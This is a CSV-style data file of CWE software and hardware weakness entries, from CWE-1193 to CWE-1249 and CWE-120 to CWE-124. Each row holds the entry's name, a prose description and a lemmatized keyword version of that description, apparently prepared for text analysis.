soc ip apply policy act identifier securely
CWE-1193,Power-On of Untrusted Execution Core Before Enabling Fabric Access Control,"The product enables components that contain untrusted firmware before memory and fabric access controls have been enabled.After initial reset, System-on-Chip (SoC) fabric access controls and other security features need to be programmed by trusted firmware as part of the boot sequence. If untrusted IPs or peripheral microcontrollers are enabled first, then the untrusted component can master transactions on the hardware bus and target memory or other assets to compromise the SoC boot firmware.",product enable component contain untrusted firmware memory fabric access control enable initial reset system chip soc fabric access control security feature need program trusted firmware boot sequence untrusted ip peripheral microcontroller enable untrusted component master transaction hardware bus target memory asset compromise soc boot firmware
CWE-12,ASP.NET Misconfiguration: Missing Custom Error Page,An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.,asp application enable custom error page order prevent attacker mine information framework build response
CWE-120,Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'),"The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.A buffer overflow condition exists when a product attempts to put more data in a buffer than it can hold, or when it attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the ""classic"" case in which the product copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.",product copy input buffer output buffer verify size input buffer size output buffer lead buffer overflow buffer overflow condition exist product attempt datum buffer hold attempt datum memory area outside boundary buffer simple type error common cause buffer overflow classic case product copy buffer restrict copy variant exist existence classic overflow strongly suggest programmer consider basic security protection
CWE-1204,Generation of Weak Initialization Vector (IV),"The product uses a cryptographic primitive that uses an Initialization Vector (IV), but the product does not generate IVs that are sufficiently unpredictable or unique according to the expected cryptographic requirements for that primitive.By design, some cryptographic primitives (such as block ciphers) require that IVs must have certain properties for the uniqueness and/or unpredictability of an IV. Primitives may vary in how important these properties are. If these properties are not maintained, e.g. by a bug in the code, then the cryptography may be weakened or broken by attacking the IVs themselves.",product use cryptographic primitive use initialization vector iv product generate iv sufficiently unpredictable unique accord expected cryptographic requirement primitive design cryptographic primitive block cipher require iv certain property uniqueness unpredictability iv primitive vary important property property maintain bug code cryptography weaken break attack iv
CWE-1209,Failure to Disable Reserved Bits,"The reserved bits in a hardware design are not disabled prior to production. Typically, reserved bits are used for future capabilities and should not support any functional logic in the design. However, designers might covertly use these bits to debug or further develop new capabilities in production hardware. Adversaries with access to these bits will write to them in hopes of compromising hardware state.Reserved bits are labeled as such so they can be allocated for a later purpose. They are not to do anything in the current design. However, designers might want to use these bits to debug or control/configure a future capability to help minimize time to market (TTM). If the logic being controlled by these bits is still enabled in production, an adversary could use the logic to induce unwanted/unsupported behavior in the hardware.",reserve bit hardware design disable prior production typically reserve bit future capability support functional logic design designer covertly use bit debug develop new capability production hardware adversary access bit write hope compromise hardware state reserved bit label allocate later purpose current design designer want use bit debug control configure future capability help minimize time market ttm logic control bit enable production adversary use logic induce unwanted unsupported behavior hardware
CWE-121,Stack-based Buffer Overflow,"A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).",stack base buffer overflow condition condition buffer overwrite allocate stack local variable rarely parameter function
CWE-122,Heap-based Buffer Overflow,"A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().",heap overflow condition buffer overflow buffer overwrite allocate heap portion memory generally mean buffer allocate routine malloc
CWE-1220,Insufficient Granularity of Access Control,"The product implements access controls via a policy or other feature with the intention to disable or restrict accesses (reads and/or writes) to assets in a system from untrusted agents. However, implemented access controls lack required granularity, which renders the control policy too broad because it allows accesses from unauthorized agents to the security-sensitive assets.Integrated circuits and hardware engines can expose accesses to assets (device configuration, keys, etc.) to trusted firmware or a software module (commonly set by BIOS/bootloader). This access is typically access-controlled. Upon a power reset, the hardware or system usually starts with default values in registers, and the trusted firmware (Boot firmware) configures the necessary access-control protection.A common weakness that can exist in such protection schemes is that access controls or policies are not granular enough. This condition allows agents beyond trusted agents to access assets and could lead to a loss of functionality or the ability to set up the device securely. This further results in security risks from leaked, sensitive, key material to modification of device configuration.",product implement access control policy feature intention disable restrict access read write asset system untrusted agent implement access control lack require granularity render control policy broad allow access unauthorized agent security sensitive asset integrate circuit hardware engine expose access asset device configuration key etc trust firmware software module commonly set bios bootloader access typically access control power reset hardware system usually start default value register trusted firmware boot firmware configure necessary access control protection common weakness exist protection scheme access control policy granular condition allow agent trust agent access asset lead loss functionality ability set device securely result security risk leak sensitive key material modification device configuration
CWE-1221,Incorrect Register Defaults or Module Parameters,"Hardware description language code incorrectly defines register defaults or hardware IP parameters to insecure values.Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to defined default values that are hard coded in the hardware description language (HDL) code of the hardware unit. Hardware descriptive languages also support definition of parameter variables, which can be defined in code during instantiation of the hardware IP module. Such parameters are generally used to configure a specific instance of a hardware IP in the design.The system security settings of a hardware design can be affected by incorrectly defined default values or IP parameters. The hardware IP would be in an insecure state at power reset, and this can be exposed or exploited by untrusted software running on the system. Both register defaults and parameters are hardcoded values, which cannot be changed using software or firmware patches but must be changed in hardware silicon. Thus, such security issues are considerably more difficult to address later in the lifecycle. Hardware designs can have a large number of such parameters and register defaults settings, and it is important to have design tool support to check these settings in an automated way and be able to identify which settings are security sensitive.",hardware description language code incorrectly define register default hardware ip parameter insecure value integrate circuit hardware ip software programmable control setting commonly store register circuit register content initialize hardware reset define default value hard code hardware description language hdl code hardware unit hardware descriptive language support definition parameter variable define code instantiation hardware ip module parameter generally configure specific instance hardware ip design system security setting hardware design affect incorrectly define default value ip parameter hardware ip insecure state power reset expose exploit untrusted software run system register default parameter hardcode value change software firmware patch change hardware silicon security issue considerably difficult address later lifecycle hardware design large number parameter register default setting important design tool support check setting automated way able identify setting security sensitive
CWE-1222,Insufficient Granularity of Address Regions Protected by Register Locks,"The product defines a large address region protected from modification by the same register lock control bit. This results in a conflict between the functional requirement that some addresses need to be writable by software during operation and the security requirement that the system configuration lock bit must be set during the boot process.Integrated circuits and hardware IPs can expose the device configuration controls that need to be programmed after device power reset by a trusted firmware or software module (commonly set by BIOS/bootloader) and then locked from any further modification. In hardware design, this is commonly implemented using a programmable lock bit which enables/disables writing to a protected set of registers or address regions. When the programmable lock bit is set, the relevant address region can be implemented as a hardcoded value in hardware logic that cannot be changed later.A problem can arise wherein the protected region definition is not granular enough. After the programmable lock bit has been set, then this new functionality cannot be implemented without change to the hardware design.",product define large address region protect modification register lock control bit result conflict functional requirement address need writable software operation security requirement system configuration lock bit set boot process integrated circuit hardware ip expose device configuration control need program device power reset trusted firmware software module commonly set bios bootloader lock modification hardware design commonly implement programmable lock bit enable disable write protect set register address region programmable lock bit set relevant address region implement hardcode value hardware logic change later problem arise protect region definition granular programmable lock bit set new functionality implement change hardware design
CWE-1223,Race Condition for Write-Once Attributes,"A write-once register in hardware design is programmable by an untrusted software component earlier than the trusted software component, resulting in a race condition issue.Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to defined default values that are hard coded in the hardware description language (HDL) code of the hardware unit. A common security protection method used to protect register settings from modification by software is to make them write-once. This means the hardware implementation only allows writing to such registers once, and they become read-only after having been written once by software. This is useful to allow initial boot software to configure systems settings to secure values while blocking runtime software from modifying such hardware settings.Implementation issues in hardware design of such controls can expose such registers to a race condition security flaw. For example, consider a hardware design that has two different software/firmware modules executing in parallel. One module is trusted (module A) and another is untrusted (module B). In this design it could be possible for Module B to send write cycles to the write-once register before Module A. Since the field is write-once the programmed value from Module A will be ignored and the pre-empted value programmed by Module B will be used by hardware.",write register hardware design programmable untrusted software component early trust software component result race condition issue integrated circuit hardware ip software programmable control setting commonly store register circuit register content initialize hardware reset define default value hard code hardware description language hdl code hardware unit common security protection method protect register setting modification software write mean hardware implementation allow write register read having write software useful allow initial boot software configure system setting secure value block runtime software modify hardware setting implementation issue hardware design control expose register race condition security flaw example consider hardware design different software firmware module execute parallel module trust module untrusted module b design possible module b send write cycle write register module field write program value module ignore pre empted value program module b hardware
CWE-1224,Improper Restriction of Write-Once Bit Fields,"The hardware design control register ""sticky bits"" or write-once bit fields are improperly implemented, such that they can be reprogrammed by software.Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to define default values that are hard coded in the hardware description language (HDL) code of the hardware unit. A common security protection method used to protect register settings from modification by software is to make the settings write-once or ""sticky."" This allows writing to such registers only once, whereupon they become read-only. This is useful to allow initial boot software to configure systems settings to secure values while blocking runtime software from modifying such hardware settings.Failure to implement write-once restrictions in hardware design can expose such registers to being re-programmed by software and written multiple times. For example, write-once fields could be implemented to only be write-protected if they have been set to value ""1"", wherein they would work as ""write-1-once"" and not ""write-once"".",hardware design control register sticky bit write bit field improperly implement reprogramme software integrate circuit hardware ip software programmable control setting commonly store register circuit register content initialize hardware reset define default value hard code hardware description language hdl code hardware unit common security protection method protect register setting modification software setting write sticky allow write register read useful allow initial boot software configure system setting secure value block runtime software modify hardware setting failure implement write restriction hardware design expose register program software write multiple time example write field implement write protect set value work write
CWE-1229,Creation of Emergent Resource,"The product manages resources or behaves in a way that indirectly creates a new, distinct resource that can be used by attackers in violation of the intended policy.A product is only expected to behave in a way that was specifically intended by the developer. Resource allocation and management is expected to be performed explicitly by the associated code. However, in systems with complex behavior, the product might indirectly produce new kinds of resources that were never intended in the original design. For example, a covert channel is a resource that was never explicitly intended by the developer, but it is useful to attackers. ""Parasitic computing,"" while not necessarily malicious in nature, effectively tricks a product into performing unintended computations on behalf of another party.",product manage resource behave way indirectly create new distinct resource attacker violation intend policy product expect behave way specifically intend developer resource allocation management expect perform explicitly associate code system complex behavior product indirectly produce new kind resource intend original design example covert channel resource explicitly intend developer useful attacker parasitic computing necessarily malicious nature effectively trick product perform unintended computation behalf party
CWE-123,Write-what-where Condition,"Any condition where the attacker has the ability to write an arbitrary value to an arbitrary location, often as the result of a buffer overflow.",condition attacker ability write arbitrary value arbitrary location result buffer overflow
CWE-1230,Exposure of Sensitive Information Through Metadata,"The product prevents direct access to a resource containing sensitive information, but it does not sufficiently limit access to metadata that is derived from the original, sensitive information.Developers might correctly prevent unauthorized access to a database or other resource containing sensitive information, but they might not consider that portions of the original information might also be recorded in metadata, search indices, statistical reports, or other resources. If these resources are not also restricted, then attackers might be able to extract some or all of the original information, or otherwise infer some details. For example, an attacker could specify search terms that are known to be unique to a particular person, or view metadata such as activity or creation dates in order to identify usage patterns.",product prevent direct access resource contain sensitive information sufficiently limit access metadata derive original sensitive information developer correctly prevent unauthorized access database resource contain sensitive information consider portion original information record metadata search index statistical report resource resource restrict attacker able extract original information infer detail example attacker specify search term know unique particular person view metadata activity creation date order identify usage pattern
CWE-1231,Improper Prevention of Lock Bit Modification,"The product uses a trusted lock bit for restricting access to registers, address regions, or other resources, but the product does not prevent the value of the lock bit from being modified after it has been set.In integrated circuits and hardware intellectual property (IP) cores, device configuration controls are commonly programmed after a device power reset by a trusted firmware or software module (e.g., BIOS/bootloader) and then locked from any further modification.This behavior is commonly implemented using a trusted lock bit. When set, the lock bit disables writes to a protected set of registers or address regions. Design or coding errors in the implementation of the lock bit protection feature may allow the lock bit to be modified or cleared by software after it has been set. Attackers might be able to unlock the system and features that the bit is intended to protect.",product use trust lock bit restrict access register address region resource product prevent value lock bit modify set integrated circuit hardware intellectual property ip core device configuration control commonly program device power reset trust firmware software module bios bootloader lock modification behavior commonly implement trust lock bit set lock bit disable write protect set register address region design coding error implementation lock bit protection feature allow lock bit modify clear software set attacker able unlock system feature bit intend protect
CWE-1232,Improper Lock Behavior After Power State Transition,"Register lock bit protection disables changes to system configuration once the bit is set. Some of the protected registers or lock bits become programmable after power state transitions (e.g., Entry and wake from low power sleep modes) causing the system configuration to be changeable.Devices may allow device configuration controls which need to be programmed after device power reset via a trusted firmware or software module (commonly set by BIOS/bootloader) and then locked from any further modification. This action is commonly implemented using a programmable lock bit, which, when set, disables writes to a protected set of registers or address regions.After a power state transition, the lock bit is set to unlocked. Some common weaknesses that can exist in such a protection scheme are that the lock gets cleared, the values of the protected registers get reset, or the lock become programmable.",register lock bit protection disable change system configuration bit set protect register lock bit programmable power state transition entry wake low power sleep mode cause system configuration changeable device allow device configuration control need program device power reset trust firmware software module commonly set bios bootloader lock modification action commonly implement programmable lock bit set disable write protect set register address region power state transition lock bit set unlocked common weakness exist protection scheme lock gets clear value protect register reset lock programmable
CWE-1233,Security-Sensitive Hardware Controls with Missing Lock Bit Protection,"The product uses a register lock bit protection mechanism, but it does not ensure that the lock bit prevents modification of system registers or controls that perform changes to important hardware system configuration.Integrated circuits and hardware intellectual properties (IPs) might provide device configuration controls that need to be programmed after device power reset by a trusted firmware or software module, commonly set by BIOS/bootloader. After reset, there can be an expectation that the controls cannot be used to perform any further modification. This behavior is commonly implemented using a trusted lock bit, which can be set to disable writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration).However, if the lock bit does not effectively write-protect all system registers or controls that could modify the protected system configuration, then an adversary may be able to use software to access the registers/controls and modify the protected hardware configuration.",product use register lock bit protection mechanism ensure lock bit prevent modification system register control perform change important hardware system configuration integrated circuit hardware intellectual property ip provide device configuration control need program device power reset trust firmware software module commonly set bios bootloader reset expectation control perform modification behavior commonly implement trust lock bit set disable write protect set register address region lock protection intend prevent modification certain system configuration memory memory protection unit lock bit effectively write protect system register control modify protect system configuration adversary able use software access register control modify protect hardware configuration
CWE-1234,Hardware Internal or Debug Modes Allow Override of Locks,"System configuration protection may be bypassed during debug mode.Device configuration controls are commonly programmed after a device power reset by a trusted firmware or software module (e.g., BIOS/bootloader) and then locked from any further modification. This is commonly implemented using a trusted lock bit, which when set, disables writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration). If debug features supported by hardware or internal modes/system states are supported in the hardware design, modification of the lock protection may be allowed allowing access and modification of configuration information.",system configuration protection bypass debug mode device configuration control commonly program device power reset trust firmware software module bios bootloader lock modification commonly implement trust lock bit set disable write protect set register address region lock protection intend prevent modification certain system configuration memory memory protection unit configuration debug feature support hardware internal mode system state support hardware design modification lock protection allow allow access modification configuration information
CWE-1235,Incorrect Use of Autoboxing and Unboxing for Performance Critical Operations,"The code uses boxed primitives, which may introduce inefficiencies into performance-critical operations.Languages such as Java and C# support automatic conversion through their respective compilers from primitive types into objects of the corresponding wrapper classes, and vice versa. For example, a compiler might convert an int to Integer (called autoboxing) or an Integer to int (called unboxing). This eliminates forcing the programmer to perform these conversions manually, which makes the code cleaner.However, this feature comes at a cost of performance and can lead to resource exhaustion and impact availability when used with generic collections. Therefore, they should not be used for scientific computing or other performance critical operations. They are only suited to support ""impedance mismatch"" between reference types and primitives.",code use box primitive introduce inefficiency performance critical operation language java c support automatic conversion respective compiler primitive type object corresponding wrapper class vice versa example compiler convert int integer call autoboxing integer int call unboxing eliminate force programmer perform conversion manually make code clean feature come cost performance lead resource exhaustion impact availability generic collection scientific computing performance critical operation suited support impedance mismatch reference type primitive
CWE-1236,Improper Neutralization of Formula Elements in a CSV File,"The product saves user-provided information into a Comma-Separated Value (CSV) file, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as a command when the file is opened by a spreadsheet product.User-provided data is often saved to traditional databases. This data can be exported to a CSV file, which allows users to read the data using spreadsheet software such as Excel, Numbers, or Calc. This software interprets entries beginning with '=' as formulas, which are then executed by the spreadsheet software. The software's formula language often allows methods to access hyperlinks or the local command line, and frequently allows enough characters to invoke an entire script. Attackers can populate data fields which, when saved to a CSV file, may attempt information exfiltration or other malicious activity when automatically executed by the spreadsheet software.",product save user provide information comma separated value csv file neutralize incorrectly neutralize special element interpret command file open spreadsheet product user provide data save traditional database data export csv file allow user read datum spreadsheet software excel numbers calc software interpret entry begin formula execute spreadsheet software software formula language allow method access hyperlink local command line frequently allow character invoke entire script attacker populate data field save csv file attempt information exfiltration malicious activity automatically execute spreadsheet software
CWE-1239,Improper Zeroization of Hardware Register,"The hardware product does not properly clear sensitive information from built-in registers when the user of the hardware block changes.Hardware logic operates on data stored in registers local to the hardware block. Most hardware IPs, including cryptographic accelerators, rely on registers to buffer I/O, store intermediate values, and interface with software. The result of this is that sensitive information, such as passwords or encryption keys, can exist in locations not transparent to the user of the hardware logic. When a different entity obtains access to the IP due to a change in operating mode or conditions, the new entity can extract information belonging to the previous user if no mechanisms are in place to clear register contents. It is important to clear information stored in the hardware if a physical attack on the product is detected, or if the user of the hardware block changes. The process of clearing register contents in a hardware IP is referred to as zeroization in standards for cryptographic hardware modules such as FIPS-140-2 [REF-267].",hardware product properly clear sensitive information build register user hardware block change hardware logic operate datum store register local hardware block hardware ip include cryptographic accelerator rely register buffer o store intermediate value interface software result sensitive information password encryption key exist location transparent user hardware logic different entity obtain access ip change operating mode condition new entity extract information belong previous user mechanism place clear register content important clear information store hardware physical attack product detect user hardware block change process clear register content hardware ip refer zeroization standard cryptographic hardware module
CWE-124,Buffer Underwrite ('Buffer Underflow'),"The product writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.",product write buffer index pointer reference memory location prior beginning buffer typically occur pointer index decremente position buffer pointer arithmetic result position beginning valid memory location negative index
CWE-1240,Use of a Cryptographic Primitive with a Risky Implementation,"To fulfill the need for a cryptographic primitive, the product implements a cryptographic algorithm using a non-standard, unproven, or disallowed/non-compliant cryptographic implementation.Cryptographic protocols and systems depend on cryptographic primitives (and associated algorithms) as their basic building blocks. Some common examples of primitives are digital signatures, one-way hash functions, ciphers, and public key cryptography; however, the notion of ""primitive"" can vary depending on point of view. See ""Terminology Notes"" for further explanation of some concepts.Cryptographic primitives are defined to accomplish one very specific task in a precisely defined and mathematically reliable fashion. For example, suppose that for a specific cryptographic primitive (such as an encryption routine), the consensus is that the primitive can only be broken after trying out N different inputs (where the larger the value of N, the stronger the cryptography). For an encryption scheme like AES-256, one would expect N to be so large as to be infeasible to execute in a reasonable amount of time.If a vulnerability is ever found that shows that one can break a cryptographic primitive in significantly less than the expected number of attempts, then that primitive is considered weakened (or sometimes in extreme cases, colloquially it is ""broken""). As a result, anything using this cryptographic primitive would now be considered insecure or risky. Thus, even breaking or weakening a seemingly small cryptographic primitive has the potential to render the whole system vulnerable, due to its reliance on the primitive. A historical example can be found in TLS when using DES. One would colloquially call DES the cryptographic primitive for transport encryption in this version of TLS. In the past, DES was considered strong, because no weaknesses were found in it; importantly, DES has a key length of 56 bits. Trying N=2^56 keys was considered impractical for most actors. Unfortunately, attacking a system with 56-bit keys is now practical via brute force, which makes defeating DES encryption practical. It is now practical for an adversary to read any information sent under this version of TLS and use this information to attack the system. As a result, it can be claimed that this use of TLS is weak, and that any system depending on TLS with DES could potentially render the entire system vulnerable to attack.Cryptographic primitives and associated algorithms are only considered safe after extensive research and review from experienced cryptographers from academia, industry, and government entities looking for any possible flaws. Furthermore, cryptographic primitives and associated algorithms are frequently reevaluated for safety when new mathematical and attack techniques are discovered. As a result and over time, even well-known cryptographic primitives can lose their compliance status with the discovery of novel attacks that might either defeat the algorithm or reduce its robustness significantly.If ad-hoc cryptographic primitives are implemented, it is almost certain that the implementation will be vulnerable to attacks that are well understood by cryptographers, resulting in the exposure of sensitive information and other consequences.This weakness is even more difficult to manage for hardware-implemented deployment of cryptographic algorithms. First, because hardware is not patchable as easily as software, any flaw discovered after release and production typically cannot be fixed without a recall of the product. Secondly, the hardware product is often expected to work for years, during which time computation power available to the attacker only increases. Therefore, for hardware implementations of cryptographic primitives, it is absolutely essential that only strong, proven cryptographic primitives are used.",fulfill need cryptographic primitive product implement cryptographic algorithm non standard unproven disallowed non compliant cryptographic implementation cryptographic protocol system depend cryptographic primitive associate algorithm basic building block common example primitive digital signature way hash function cipher public key cryptography notion primitive vary depend point view terminology note explanation concept cryptographic primitive define accomplish specific task precisely define mathematically reliable fashion example suppose specific cryptographic primitive encryption routine consensus primitive break try n different input large value n strong cryptography encryption scheme like expect n large infeasible execute reasonable time vulnerability find show break cryptographic primitive significantly expect number attempt primitive consider weaken extreme case colloquially break result cryptographic primitive consider insecure risky break weaken seemingly small cryptographic primitive potential render system vulnerable reliance primitive historical example find tls des colloquially des cryptographic primitive transport encryption version tls past des consider strong weakness find importantly des key length bit try key consider impractical actor unfortunately attack system bit key practical brute force make defeat des encryption practical practical adversary read information send version tls use information attack system result claim use tls weak system depend tls des potentially render entire system vulnerable attack cryptographic primitive associate algorithm consider safe extensive research review experienced cryptographer academia industry government entity look possible flaw furthermore cryptographic primitive associate algorithm frequently reevaluate safety new mathematical attack technique discover result time know cryptographic primitive lose compliance status discovery novel attack defeat algorithm reduce robustness significantly ad hoc cryptographic primitive implement certain implementation vulnerable attack understand cryptographer result exposure sensitive information consequence weakness difficult manage hardware implement deployment cryptographic algorithm hardware patchable easily software flaw discover release production typically fix recall product secondly hardware product expect work year time computation power available attacker increase hardware implementation cryptographic primitive absolutely essential strong prove cryptographic primitive
CWE-1241,Use of Predictable Algorithm in Random Number Generator,The device uses an algorithm that is predictable and generates a pseudo-random number.,device use algorithm predictable generate pseudo random number
CWE-1242,Inclusion of Undocumented Features or Chicken Bits,"The device includes chicken bits or undocumented features that can create entry points for unauthorized actors.A common design practice is to use undocumented bits on a device that can be used to disable certain functional security features. These bits are commonly referred to as ""chicken bits"". They can facilitate quick identification and isolation of faulty components, features that negatively affect performance, or features that do not provide the required controllability for debug and test. Another way to achieve this is through implementation of undocumented features. An attacker might exploit these interfaces for unauthorized access.",device include chicken bit undocumented feature create entry point unauthorized actor common design practice use undocumented bit device disable certain functional security feature bit commonly refer chicken bit facilitate quick identification isolation faulty component feature negatively affect performance feature provide require controllability debug test way achieve implementation undocumented feature attacker exploit interface unauthorized access
CWE-1243,Sensitive Non-Volatile Information Not Protected During Debug,"Access to security-sensitive information stored in fuses is not limited during debug.Several security-sensitive values are programmed into fuses to be used during early-boot flows or later at runtime. Examples of these security-sensitive values include root keys, encryption keys, manufacturing-specific information, chip-manufacturer-specific information, and original-equipment-manufacturer (OEM) data. After the chip is powered on, these values are sensed from fuses and stored in temporary locations such as registers and local memories. These locations are typically access-control protected from untrusted agents capable of accessing them. Even to trusted agents, only read-access is provided. However, these locations are not blocked during debug operations, allowing a user to access this sensitive information.",access security sensitive information store fuse limit debug security sensitive value program fuse early boot flow later runtime example security sensitive value include root key encryption key manufacturing specific information chip manufacturer specific information original equipment manufacturer oem datum chip power value sense fuse store temporary location register local memory location typically access control protect untrusted agent capable access trust agent read access provide location block debug operation allow user access sensitive information
CWE-1244,Internal Asset Exposed to Unsafe Debug Access Level or State,"The product uses physical debug or test interfaces with support for multiple access levels, but it assigns the wrong debug access level to an internal asset, providing unintended access to the asset from untrusted debug agents.Debug authorization can have multiple levels of access, defined such that different system internal assets are accessible based on the current authorized debug level. Other than debugger authentication (e.g., using passwords or challenges), the authorization can also be based on the system state or boot stage. For example, full system debug access might only be allowed early in boot after a system reset to ensure that previous session data is not accessible to the authenticated debugger.If this protection mechanism does not ensure that internal assets have the correct debug access level during each boot stage or change in system state, an attacker could obtain sensitive information from the internal asset using a debugger.",product use physical debug test interface support multiple access level assign wrong debug access level internal asset provide unintended access asset untrusted debug agent debug authorization multiple level access define different system internal asset accessible base current authorized debug level debugger authentication password challenge authorization base system state boot stage example system debug access allow early boot system reset ensure previous session data accessible authenticate debugger protection mechanism ensure internal asset correct debug access level boot stage change system state attacker obtain sensitive information internal asset debugger
CWE-1245,Improper Finite State Machines (FSMs) in Hardware Logic,"Faulty finite state machines (FSMs) in the hardware logic allow an attacker to put the system in an undefined state, to cause a denial of service (DoS) or gain privileges on the victim's system.The functionality and security of the system heavily depend on the implementation of FSMs. FSMs can be used to indicate the current security state of the system. Lots of secure data operations and data transfers rely on the state reported by the FSM. Faulty FSM designs that do not account for all states, either through undefined states (left as don't cares) or through incorrect implementation, might lead an attacker to drive the system into an unstable state from which the system cannot recover without a reset, thus causing a DoS. Depending on what the FSM is used for, an attacker might also gain additional privileges to launch further attacks and compromise the security guarantees.",faulty finite state machine fsms hardware logic allow attacker system undefined state cause denial service dos gain privilege victim system functionality security system heavily depend implementation fsms fsms indicate current security state system lot secure data operation data transfer rely state report fsm faulty fsm design account state undefined state leave cares incorrect implementation lead attacker drive system unstable state system recover reset cause depend fsm attacker gain additional privilege launch attack compromise security guarantee
CWE-1246,Improper Write Handling in Limited-write Non-Volatile Memories,"The product does not implement or incorrectly implements wear leveling operations in limited-write non-volatile memories.Non-volatile memories such as NAND Flash, EEPROM, etc. have individually erasable segments, each of which can be put through a limited number of program/erase or write cycles. For example, the device can only endure a limited number of writes, after which the device becomes unreliable. In order to wear out the cells in a uniform manner, non-volatile memory and storage products based on the above-mentioned technologies implement a technique called wear leveling. Once a set threshold is reached, wear leveling maps writes of a logical block to a different physical block. This prevents a single physical block from prematurely failing due to a high concentration of writes. If wear leveling is improperly implemented, attackers may be able to programmatically cause the storage to become unreliable within a much shorter time than would normally be expected.",product implement incorrectly implement wear leveling operation limited write non volatile memory non volatile memory nand flash eeprom etc individually erasable segment limited number program erase write cycle example device endure limited number write device unreliable order wear cell uniform manner non volatile memory storage product base mention technology implement technique call wear leveling set threshold reach wear leveling map write logical block different physical block prevent single physical block prematurely fail high concentration write wear leveling improperly implement attacker able programmatically cause storage unreliable short time normally expect
CWE-1247,Improper Protection Against Voltage and Clock Glitches,"The device does not contain or contains incorrectly implemented circuitry or sensors to detect and mitigate voltage and clock glitches and protect sensitive information or software contained on the device.A device might support features such as secure boot which are supplemented with hardware and firmware support. This involves establishing a chain of trust, starting with an immutable root of trust by checking the signature of the next stage (culminating with the OS and runtime software) against a golden value before transferring control. The intermediate stages typically set up the system in a secure state by configuring several access control settings. Similarly, security logic for exercising a debug or testing interface may be implemented in hardware, firmware, or both. A device needs to guard against fault attacks such as voltage glitches and clock glitches that an attacker may employ in an attempt to compromise the system.",device contain contain incorrectly implement circuitry sensor detect mitigate voltage clock glitch protect sensitive information software contain device device support feature secure boot supplement hardware firmware support involve establish chain trust start immutable root trust check signature stage culminate os runtime software golden value transfer control intermediate stage typically set system secure state configure access control setting similarly security logic exercise debug testing interface implement hardware firmware device need guard fault attack voltage glitch clock glitch attacker employ attempt compromise system
CWE-1248,Semiconductor Defects in Hardware Logic with Security-Sensitive Implications,"The security-sensitive hardware module contains semiconductor defects.A semiconductor device can fail for various reasons. While some are manufacturing and packaging defects, the rest are due to prolonged use or usage under extreme conditions. Some mechanisms that lead to semiconductor defects include encapsulation failure, die-attach failure, wire-bond failure, bulk-silicon defects, oxide-layer faults, aluminum-metal faults (including electromigration, corrosion of aluminum, etc.), and thermal/electrical stress. These defects manifest as faults on chip-internal signals or registers, have the effect of inputs, outputs, or intermediate signals being always 0 or always 1, and do not switch as expected. If such faults occur in security-sensitive hardware modules, the security objectives of the hardware module may be compromised.",security sensitive hardware module contain semiconductor defect semiconductor device fail reason manufacturing packaging defect rest prolonged use usage extreme condition mechanism lead semiconductor defect include encapsulation failure die attach failure wire bond failure bulk silicon defect oxide layer fault aluminum metal fault include electromigration corrosion aluminum etc thermal electrical stress defect manifest fault chip internal signal register effect input output intermediate signal switch expect fault occur security sensitive hardware module security objective hardware module compromise
CWE-1249,Application-Level Admin Tool with Inconsistent View of Underlying Operating System,"The product provides an application for administrators to manage parts of the underlying operating system, but the application does not accurately identify all of the relevant entities or resources that exist in the OS; that is, the application's model of the OS's state is inconsistent with the OS's actual state.Many products provide web-based applications or other interfaces for managing the underlying operating system. This is common with cloud, network access devices, home networking, and other systems. When the management tool does not accurately represent what is in the OS - such as user accounts - then the administrator might not see suspicious activities that would be noticed otherwise.For example, numerous systems utilize a web front-end for administrative control. They also offer the ability to add, alter, and drop users with various privileges as it relates to the functionality of the system. A potential architectural weakness may exist where the user information reflected in the web interface does not mirror the users in the underlying operating system. Many web UI or REST APIs use the underlying operating system for authentication; the system's logic may also track an additional set of user capabilities within configuration files and datasets for authorization capabilities. When there is a discrepancy between the user information in the UI or REST API's interface system and the underlying operating system's user listing, this may introduce a weakness into the system. For example, if an attacker compromises the OS and adds a new user account - a ""ghost"" account - then the attacker could escape detection if the management tool does not list the newly-added account.This discrepancy could be exploited in several ways:A rogue admin could insert a new account into a system that willpersist if they are terminated or wish to take action on a system thatcannot be directly associated with them.An attacker can leverage a separate command injection attack available through the web interface to insert a ghost account with shell privileges such as ssh.An attacker can leverage existing web interface APIs, manipulated in such a way that a new user is inserted into the operating system, and the user web account is either partially created or not at all.An attacker could create an admin account which is viewable by an administrator, use this account to create the ghost account, delete logs and delete the first created admin account.Many of these attacker scenarios can be realized by leveraging separate vulnerabilities related to XSS, command injection, authentication bypass, or logic flaws on the various systems.",product provide application administrator manage part underlying operate system application accurately identify relevant entity resource exist os application model os state inconsistent os actual state product provide web base application interface manage underlie operate system common cloud network access device home networking system management tool accurately represent os user account administrator suspicious activity notice example numerous system utilize web end administrative control offer ability add alter drop user privilege relate functionality system potential architectural weakness exist user information reflect web interface mirror user underlying operate system web ui rest api use underlying operate system authentication system logic track additional set user capability configuration file dataset authorization capability discrepancy user information ui rest api interface system underlying operate system user listing introduce weakness system example attacker compromise os add new user account ghost account attacker escape detection management tool list newly add account discrepancy exploit way rogue admin insert new account system willpersist terminate wish action system thatcannot directly associate attacker leverage separate command injection attack available web interface insert ghost account shell privilege ssh attacker leverage exist web interface api manipulate way new user insert operate system user web account partially create attacker create admin account viewable administrator use account create ghost account delete log delete create admin account attacker scenario realize leverage separate vulnerability relate xss command injection authentication bypass logic flaw system
